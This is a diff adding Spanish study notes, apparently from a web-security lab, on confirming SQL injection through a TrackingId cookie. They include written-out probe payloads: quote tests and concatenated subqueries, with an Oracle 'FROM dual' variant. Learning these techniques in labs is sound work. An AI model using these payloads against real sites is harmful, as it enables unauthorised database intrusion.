@@ -215,6 +215,21 @@ END AS QuantityText
 FROM OrderDetails;
 ```
 
+Procedimiento
+```
+SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId'
+
+2.- SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId'' -> ERROR DE SINTAXIS
+3.- SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId''' -> '' SE PUEDE VER COMO UN NULL
+4.- SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId=xyz'||(SELECT '')||'' -> '' CONCATENA UN SELECT VACIO, 1) VERIFICA QUE LA ENTRADA SE ESTA ENVIANDO DIRECTAMENTE A LA BASE DE DATOS  2) IDENTIFICA EL COMPORTAMIENTO
+```
+1. Entrar al sitio
+2. Añadir una comilla simple y verificar el mensaje de error `TrackingId=xyz'` > dara un mensaje de error de sintaxis
+3. Ahora añadir 2 comillas `TrackingId=xyz''` > no mandará error
+4. Confirmar inyeccion SQL  `TrackingId=xyz'||(SELECT '')||'` > Si ejecuta el comando confirma que se pueden realizar subconsultas por lo tanto es vulnerable, además de que no altera información
+5. No funciono por lo tantoa la sintaxis puede ser erroronea, se intenta con la sintais de Oracle `TrackingId=xyz'||(SELECT '' FROM dual)||'
+`
+
 # Hola
 ## HOLA
 ### HOLA
